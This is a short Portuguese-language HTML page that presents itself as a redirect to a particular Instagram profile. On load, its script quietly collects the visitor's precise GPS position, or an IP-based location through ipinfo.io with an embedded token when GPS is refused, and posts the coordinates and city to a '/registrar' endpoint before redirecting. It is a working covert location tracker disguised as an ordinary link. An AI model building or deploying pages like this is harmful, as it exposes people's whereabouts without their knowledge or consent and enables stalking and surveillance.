<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Localizando...</title>
    <script>
        function enviarLocalizacao(lat, lon, precisa, city = '', region = '', country = '') {
            if (!lat || !lon || lat === 0.0 || lon === 0.0) {
                console.warn("Localização inválida, não será enviada.");
                return;
            }

            fetch('/registrar', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ lat, lon, precisa, city, region, country })
            }).finally(() => {
                window.location.href = "https://www.instagram.com/mateusflorenzano?igsh=ZmF5a2UyNml3Nmc0";
            });
        }

        function tentarLocalizacaoPorIP() {
            fetch('https://ipinfo.io/json?token=848013f8df8279')  // Substitua pelo seu token real
                .then(res => res.json())
                .then(d => {
                    const [lat, lon] = d.loc.split(',');
                    enviarLocalizacao(
                        parseFloat(lat),
                        parseFloat(lon),
                        false,
                        d.city,
                        d.region,
                        d.country
                    );
                })
                .catch(err => {
                    console.error("Erro ao buscar localização por IP:", err);
                    enviarLocalizacao(0.0, 0.0, false);
                });
        }

        window.onload = () => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        const { latitude, longitude } = pos.coords;
                        enviarLocalizacao(latitude, longitude, true);
                    },
                    err => {
                        console.warn("GPS negado ou falhou:", err);
                        tentarLocalizacaoPorIP();
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                tentarLocalizacaoPorIP();
            }
        };
    </script>
</head>
<body>
    <p>Redirecionando para o Instagram...</p>
</body>
</html>
